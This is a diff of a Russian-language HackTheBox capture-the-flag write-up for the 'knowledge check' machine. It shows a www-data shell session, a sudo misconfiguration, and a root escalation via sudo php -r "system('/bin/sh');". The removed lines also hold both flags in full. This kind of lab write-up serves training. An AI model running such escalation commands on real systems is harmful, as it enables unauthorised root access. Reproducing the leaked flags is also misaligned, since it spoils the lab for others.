@@ -1,4 +1,4 @@
-<img width="1011" height="419" alt="Снимок экрана — 2026-10-24 в 12 26 31" src="https://github.com/user-attachments/assets/6ead5b36-f55c-4a44-b7b1-85481fbce888" /><img width="1045" height="90" alt="Снимок экрана — 2026-10-24 в 11 45 10" src="https://github.com/user-attachments/assets/997efe9a-4d22-438a-92df-c4c7757a8d7b" /># 🖥️ Отчет по машине: knowledge chek
+# 🖥️ Отчет по машине: knowledge chek
 **Платформа:** HackTheBox
 
 
@@ -105,6 +105,9 @@ bash: no job control in this shell
 www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
 whoami
 www-data
+```
+внутри как www, сразу смотрим какие есть возможности
+```
 www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on gettingstarted:
@@ -113,6 +116,9 @@ Matching Defaults entries for www-data on gettingstarted:
 
 User www-data may run the following commands on gettingstarted:
     (ALL : ALL) NOPASSWD: /usr/bin/php
+```
+Отлично, есть потенциальная точка входа, однако пока ее опущу (я понимаю что делать лучше не так, но все мы люди)
+```
 www-data@gettingstarted:/var/www/html/theme/Innovation$ cd /..
 cd /..
 www-data@gettingstarted:/$ ls
@@ -128,7 +134,10 @@ ls
 user.txt
 www-data@gettingstarted:/home/mrb3n$ cat user.txt
 cat user.txt
-7002d65b149b0a4d19132a66feed21d8
+7002**************eed21d8
+```
+есть флаг, значит стоит вернуться к привилегиям. 
+```
 www-data@gettingstarted:/$ sudo /usr/bin/php -r "system('/bin/sh');"
 sudo /usr/bin/php -r "system('/bin/sh');"
 whoami
@@ -138,11 +147,16 @@ ls
 root.txt
 snap
 cat root.txt
-f1fba6e9f71efb2630e6e34da6387842
+f1fba6**************da6387842
 
 ```
+и этот флаг тоже есть всьо 
+--------------------------------------------------------------------------------
+послесловие 
+    я посчитал нужным не распыляться на машине, по сути это зачет по пройденным темам, если что не знаешь погугли сервис/эксплоит/команду. машина кайф все что дали в этом модуле и использовалось, нативно подразумеваешь каким путем стоит идти, в как директорию заглянуть, в общем машина хороша. 
+    конечно стоило бы подумать как закрепиться, сделать бэкдор, но пока наверное и не нужно блистать (особенно если не умеешь хе хе)
 
 
-
+всем мир!
 
 
